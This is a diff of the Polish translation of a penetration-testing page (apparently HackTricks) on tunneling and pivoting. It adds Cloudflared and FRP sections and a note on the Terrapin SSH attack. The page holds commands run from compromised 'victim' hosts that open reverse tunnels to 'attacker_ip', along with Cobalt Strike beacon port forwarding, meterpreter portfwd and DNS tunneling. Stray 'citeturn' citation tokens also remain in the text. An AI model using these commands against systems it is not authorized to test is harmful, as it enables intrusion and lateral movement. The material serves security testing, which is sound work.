@@ -2,10 +2,10 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Nmap tip
+## Wskazówka Nmap
 
 > [!WARNING]
-> **Skanowanie ICMP** i **SYN** nie może być tunelowane przez proxy socks, więc musimy **wyłączyć odkrywanie ping** (`-Pn`) i określić **skany TCP** (`-sT`), aby to działało.
+> **Skanowanie ICMP** i **SYN** nie może być tunelowane przez proxy socks, więc musimy **wyłączyć odkrywanie ping** (`-Pn`) i określić **skanowanie TCP** (`-sT`), aby to działało.
 
 ## **Bash**
 
@@ -43,7 +43,7 @@ ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in
 ```
 ### Port2Port
 
-Lokalny port --> Skompromitowany host (SSH) --> Trzecia_puszka:Port
+Lokalny port --> Skompromitowany host (SSH) --> Trzecia_boks:Port
 ```bash
 ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
 #Example
@@ -87,10 +87,14 @@ Ustaw nową trasę po stronie klienta
 ```
 route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
+> [!NOTE]
+> **Bezpieczeństwo – Atak Terrapin (CVE-2023-48795)**
+> Atak downgrade Terrapin z 2023 roku może pozwolić atakującemu typu man-in-the-middle na manipulację wczesnym handshake'em SSH i wstrzykiwanie danych do **dowolnego przekazywanego kanału** ( `-L`, `-R`, `-D` ). Upewnij się, że zarówno klient, jak i serwer są załatane (**OpenSSH ≥ 9.6/LibreSSH 6.7**) lub wyraźnie wyłącz podatne algorytmy `chacha20-poly1305@openssh.com` i `*-etm@openssh.com` w `sshd_config`/`ssh_config`, zanim polegasz na tunelach SSH. citeturn4search0
+
 ## SSHUTTLE
 
-Możesz **tunnel** przez **ssh** cały **traffic** do **subnetwork** przez hosta.\
-Na przykład, przekierowując cały traffic kierujący się do 10.10.10.0/24
+Możesz **tunelować** przez **ssh** cały **ruch** do **podsieci** przez hosta.\
+Na przykład, przekazując cały ruch kierujący się do 10.10.10.0/24
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -104,7 +108,7 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ### Port2Port
 
-Lokalny port --> Skompromitowany host (aktywna sesja) --> Trzecia_puszka:Port
+Lokalny port --> Skompromitowany host (aktywna sesja) --> Trzecia_boks:Port
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
@@ -134,7 +138,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS proxy
 
-Otwórz port w serwerze zespołowym nasłuchującym na wszystkich interfejsach, który może być użyty do **przekierowania ruchu przez beacon**.
+Otwórz port w serwerze zespołu nasłuchujący na wszystkich interfejsach, który może być użyty do **przekierowania ruchu przez beacon**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -145,21 +149,21 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 > [!WARNING]
-> W tym przypadku **port jest otwarty na hoście beacon**, a nie na serwerze zespołu, a ruch jest wysyłany do serwera zespołu, a stamtąd do wskazanego hosta:port
+> W tym przypadku **port jest otwarty w hoście beacon**, a nie w serwerze zespołu, a ruch jest wysyłany do serwera zespołu, a stamtąd do wskazanego hosta:port
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
 ```
-Do zauważenia:
+Aby zauważyć:
 
 - Odwrócone przekierowanie portów Beacona jest zaprojektowane do **tunnelingu ruchu do Serwera Zespołu, a nie do przekazywania między poszczególnymi maszynami**.
 - Ruch jest **tunnelowany w ramach ruchu C2 Beacona**, w tym linków P2P.
 - **Uprawnienia administratora nie są wymagane** do tworzenia odwróconych przekierowań portów na wysokich portach.
 
-### rPort2Port lokalnie
+### rPort2Port lokalny
 
 > [!WARNING]
-> W tym przypadku **port jest otwierany na hoście beacona**, a nie na Serwerze Zespołu, a **ruch jest wysyłany do klienta Cobalt Strike** (a nie do Serwera Zespołu) i stamtąd do wskazanego hosta:port
+> W tym przypadku **port jest otwierany w hoście beacona**, a nie w Serwerze Zespołu, a **ruch jest wysyłany do klienta Cobalt Strike** (a nie do Serwera Zespołu) i stamtąd do wskazanego hosta:port
 ```bash
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
@@ -320,9 +324,9 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-To jak wersja konsolowa PuTTY (opcje są bardzo podobne do klienta ssh).
+To jest jak konsolowa wersja PuTTY (opcje są bardzo podobne do klienta ssh).
 
-Ponieważ ten plik binarny będzie uruchamiany na ofierze i jest klientem ssh, musimy otworzyć naszą usługę ssh i port, abyśmy mogli uzyskać połączenie zwrotne. Następnie, aby przekierować tylko lokalnie dostępny port na port w naszej maszynie:
+Ponieważ ten plik binarny będzie wykonywany na ofierze i jest klientem ssh, musimy otworzyć naszą usługę ssh i port, abyśmy mogli uzyskać połączenie zwrotne. Następnie, aby przekierować tylko lokalnie dostępny port na port w naszej maszynie:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -354,9 +358,9 @@ Na swoim komputerze klienckim załaduj **`SocksOverRDP-Plugin.dll`** w ten spos�
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Teraz możemy **połączyć** się z **ofiarą** za pomocą **RDP** używając **`mstsc.exe`**, i powinniśmy otrzymać **komunikat** informujący, że **wtyczka SocksOverRDP jest włączona**, i będzie **nasłuchiwać** na **127.0.0.1:1080**.
+Teraz możemy **połączyć** się z **ofiarą** za pomocą **RDP** używając **`mstsc.exe`**, i powinniśmy otrzymać **komunikat** informujący, że **plugin SocksOverRDP jest włączony**, i będzie **nasłuchiwać** na **127.0.0.1:1080**.
 
-**Połącz** się przez **RDP** i prześlij oraz uruchom na maszynie ofiary plik binarny `SocksOverRDP-Server.exe`:
+**Połącz** się przez **RDP** i prześlij oraz uruchom na maszynie ofiary binarny plik `SocksOverRDP-Server.exe`:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
@@ -366,11 +370,11 @@ netstat -antb | findstr 1080
 ```
 Teraz możesz użyć [**Proxifier**](https://www.proxifier.com/) **do proxyzowania ruchu przez ten port.**
 
-## Proxyzowanie aplikacji GUI w systemie Windows
+## Proxify aplikacje GUI Windows
 
-Możesz sprawić, że aplikacje GUI w systemie Windows będą korzystać z proxy za pomocą [**Proxifier**](https://www.proxifier.com/).\
-W **Profile -> Proxy Servers** dodaj adres IP i port serwera SOCKS.\
-W **Profile -> Proxification Rules** dodaj nazwę programu do proxyzowania oraz połączenia do adresów IP, które chcesz proxyzować.
+Możesz sprawić, że aplikacje GUI Windows będą korzystać z proxy za pomocą [**Proxifier**](https://www.proxifier.com/).\
+W **Profile -> Proxy Servers** dodaj IP i port serwera SOCKS.\
+W **Profile -> Proxification Rules** dodaj nazwę programu do proxyzowania oraz połączenia do IP, które chcesz proxyzować.
 
 ## Ominięcie proxy NTLM
 
@@ -405,7 +409,7 @@ Odwrócony proxy stworzony przez Microsoft. Możesz go znaleźć tutaj: [https:/
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-Root jest potrzebny w obu systemach, aby utworzyć adaptery tunelowe i tunelować dane między nimi za pomocą zapytań DNS.
+Root jest potrzebny w obu systemach, aby utworzyć adaptery tunelowe i przesyłać dane między nimi za pomocą zapytań DNS.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
@@ -442,7 +446,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Zmień DNS w proxychains
 
-Proxychains przechwytuje wywołanie `gethostbyname` w libc i tuneluje zapytania DNS tcp przez proxy socks. Domyślnie serwer **DNS**, który używa proxychains, to **4.2.2.2** (wpisany na stałe). Aby go zmienić, edytuj plik: _/usr/lib/proxychains3/proxyresolv_ i zmień adres IP. Jeśli jesteś w **środowisku Windows**, możesz ustawić adres IP **kontrolera domeny**.
+Proxychains przechwytuje wywołanie `gethostbyname` w libc i tuneluje zapytania DNS tcp przez proxy socks. Domyślnie serwer DNS, który używa proxychains, to **4.2.2.2** (wpisany na stałe). Aby go zmienić, edytuj plik: _/usr/lib/proxychains3/proxyresolv_ i zmień adres IP. Jeśli jesteś w **środowisku Windows**, możesz ustawić adres IP **kontrolera domeny**.
 
 ## Tunelowanie w Go
 
@@ -480,7 +484,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **to narzędzie do eksponowania rozwiązań w Internecie w jednej linii poleceń.**\
-_URI eksponowania wygląda jak:_ **UID.ngrok.io**
+_Adresy URI ekspozycji są jak:_ **UID.ngrok.io**
 
 ### Instalacja
 
@@ -541,6 +545,71 @@ httpstatic:
 proto: http
 addr: file:///tmp/httpbin/
 ```
+## Cloudflared (Cloudflare Tunnel)
+
+Demon `cloudflared` firmy Cloudflare może tworzyć tunel wychodzący, który eksponuje **lokalne usługi TCP/UDP** bez konieczności stosowania reguł zapory przychodzącej, wykorzystując krawędź Cloudflare jako punkt spotkania. Jest to bardzo przydatne, gdy zapora wychodząca pozwala tylko na ruch HTTPS, ale połączenia przychodzące są zablokowane.
+
+### Szybki jednowierszowy tunel
+```bash
+# Expose a local web service listening on 8080
+cloudflared tunnel --url http://localhost:8080
+# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
+```
+### SOCKS5 pivot
+```bash
+# Turn the tunnel into a SOCKS5 proxy on port 1080
+cloudflared tunnel --url socks5://localhost:1080 --socks5
+# Now configure proxychains to use 127.0.0.1:1080
+```
+### Trwałe tunele z DNS
+```bash
+cloudflared tunnel create mytunnel
+cloudflared tunnel route dns mytunnel internal.example.com
+# config.yml
+Tunnel: <TUNNEL-UUID>
+credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
+url: http://127.0.0.1:8000
+```
+Rozpocznij łącznik:
+```bash
+cloudflared tunnel run mytunnel
+```
+Ponieważ cały ruch opuszcza host **wychodzący przez 443**, tunelowanie Cloudflared to prosty sposób na obejście ACL-ów przychodzących lub granic NAT. Należy pamiętać, że binarka zazwyczaj działa z podwyższonymi uprawnieniami – używaj kontenerów lub flagi `--user`, gdy to możliwe. citeturn1search0
+
+## FRP (Fast Reverse Proxy)
+
+[`frp`](https://github.com/fatedier/frp) to aktywnie utrzymywany proxy odwrotne w Go, które obsługuje **TCP, UDP, HTTP/S, SOCKS i P2P NAT-hole-punching**. Począwszy od **v0.53.0 (maj 2024)** może działać jako **SSH Tunnel Gateway**, dzięki czemu docelowy host może uruchomić odwrotny tunel, używając tylko standardowego klienta OpenSSH – nie jest wymagana dodatkowa binarka.
+
+### Klasyczny odwrotny tunel TCP
+```bash
+# Attacker / server
+./frps -c frps.toml            # listens on 0.0.0.0:7000
+
+# Victim
+./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000
+
+# frpc.toml
+serverAddr = "attacker_ip"
+serverPort = 7000
+
+[[proxies]]
+name       = "rdp"
+type       = "tcp"
+localIP    = "127.0.0.1"
+localPort  = 3389
+remotePort = 5000
+```
+### Używanie nowego bramy SSH (bez binarki frpc)
+```bash
+# On frps (attacker)
+sshTunnelGateway.bindPort = 2200   # add to frps.toml
+./frps -c frps.toml
+
+# On victim (OpenSSH client only)
+ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
+```
+Powyższe polecenie publikuje port ofiary **8080** jako **attacker_ip:9000** bez wdrażania dodatkowych narzędzi – idealne do pivotowania w trybie living-off-the-land. citeturn2search1
+
 ## Inne narzędzia do sprawdzenia
 
 - [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
